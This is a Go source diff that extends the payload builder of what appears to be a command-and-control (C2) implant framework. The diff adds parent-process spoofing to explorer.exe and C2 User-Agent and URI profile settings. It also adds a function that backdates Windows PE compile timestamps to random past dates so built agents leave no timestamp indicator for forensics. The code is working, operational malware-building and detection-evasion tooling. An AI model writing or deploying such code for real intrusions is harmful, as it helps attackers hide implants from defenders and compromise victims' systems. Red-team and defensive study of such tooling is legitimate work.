@@ -7,6 +7,7 @@ import (
 	"crypto/x509"
 	"crypto/x509/pkix"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/pem"
 	"fmt"
 	"math/big"
@@ -79,6 +80,13 @@ type EvasionOpts struct {
 	SyntheticFrames  bool   // Synthetic stack frames during sleep
 	BlockDLLs        bool   // Block non-Microsoft DLLs in child processes
 	ArgSpoof         bool   // Process argument spoofing
+	PPIDSpoof        bool   // PPID spoofing to explorer.exe (#6)
+}
+
+// ProfileOpts holds malleable profile options injected at compile time.
+type ProfileOpts struct {
+	UserAgent string
+	URI       string
 }
 
 // PosixEvasionOpts holds compile-time evasion toggles (Linux/macOS).
@@ -193,9 +201,44 @@ func generateAgentPFX(agentDir string) (func(), error) {
 	return cleanup, nil
 }
 
+// patchPETimestamp overwrites the PE TimeDateStamp with a random plausible
+// historical date (Jan 2019 – Dec 2023) so the on-disk binary doesn't carry
+// the real compile timestamp as an IOC.
+func patchPETimestamp(data []byte) []byte {
+	// Need at least a DOS header to read e_lfanew at offset 0x3C.
+	if len(data) < 0x40 {
+		return data
+	}
+	// e_lfanew: 4-byte LE offset to PE signature.
+	elfanew := int(binary.LittleEndian.Uint32(data[0x3C:0x40]))
+	// TimeDateStamp sits at e_lfanew + 8 (after PE sig(4) + Machine(2) + NumberOfSections(2)).
+	tsOffset := elfanew + 8
+	if tsOffset+4 > len(data) {
+		return data
+	}
+	// Verify PE signature "PE\0\0".
+	if elfanew+4 > len(data) || data[elfanew] != 'P' || data[elfanew+1] != 'E' ||
+		data[elfanew+2] != 0 || data[elfanew+3] != 0 {
+		return data
+	}
+	// Generate a random Unix timestamp between 2019-01-01 and 2023-12-31.
+	const (
+		minTS = 1546300800 // 2019-01-01 00:00:00 UTC
+		maxTS = 1703980800 // 2023-12-31 00:00:00 UTC
+	)
+	rangeTS := maxTS - minTS
+	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(rangeTS)))
+	if err != nil {
+		return data // crypto/rand failure — leave unchanged
+	}
+	ts := uint32(minTS + nBig.Int64())
+	binary.LittleEndian.PutUint32(data[tsOffset:tsOffset+4], ts)
+	return data
+}
+
 // Build builds the agent for the given platform. Returns output bytes, extension, error.
 func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS, useMTLS bool,
-	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts) ([]byte, string, error) {
+	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts, profile *ProfileOpts) ([]byte, string, error) {
 
 	absDir, err := ResolveAgentDir(agentDir)
 	if err != nil {
@@ -275,6 +318,7 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 			SyntheticFrames:  true,
 			BlockDLLs:        true,
 			ArgSpoof:         true,
+			PPIDSpoof:        true,
 		}
 		if evasion != nil {
 			ev = *evasion
@@ -307,6 +351,7 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 			"ENABLE_SYNTHETIC_FRAMES="+boolToFlag(ev.SyntheticFrames),
 			"ENABLE_BLOCK_DLLS="+boolToFlag(ev.BlockDLLs),
 			"ENABLE_ARG_SPOOF="+boolToFlag(ev.ArgSpoof),
+			"ENABLE_PPID_SPOOF="+boolToFlag(ev.PPIDSpoof),
 		)
 		switch strings.ToLower(outputFormat) {
 		case "exe":
@@ -324,6 +369,16 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 		default:
 			makeTarget = "exe"
 			outFile = "agent.exe"
+		}
+	}
+
+	// Inject malleable profile options (User-Agent, URI) as env vars for Make.
+	if profile != nil {
+		if profile.UserAgent != "" {
+			env = append(env, "C2_USER_AGENT="+profile.UserAgent)
+		}
+		if profile.URI != "" {
+			env = append(env, "C2_URI="+profile.URI)
 		}
 	}
 
@@ -355,6 +410,11 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 		return nil, "", fmt.Errorf("read built output: %w", err)
 	}
 
+	// Backdate PE TimeDateStamp to a plausible historical date (issue #13).
+	if platform == PlatformWindows {
+		data = patchPETimestamp(data)
+	}
+
 	ext := filepath.Ext(outFile)
 	if ext == "" {
 		ext = ".elf"
@@ -367,9 +427,9 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 
 // BuildBase64 builds and returns base64-encoded payload and filename.
 func BuildBase64(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS, useMTLS bool,
-	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts) (string, string, error) {
+	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts, profile *ProfileOpts) (string, string, error) {
 
-	data, ext, err := Build(agentDir, platform, outputFormat, c2Host, c2Port, useHTTPS, useMTLS, evasion, posixEvasion)
+	data, ext, err := Build(agentDir, platform, outputFormat, c2Host, c2Port, useHTTPS, useMTLS, evasion, posixEvasion, profile)
 	if err != nil {
 		return "", "", err
 	}
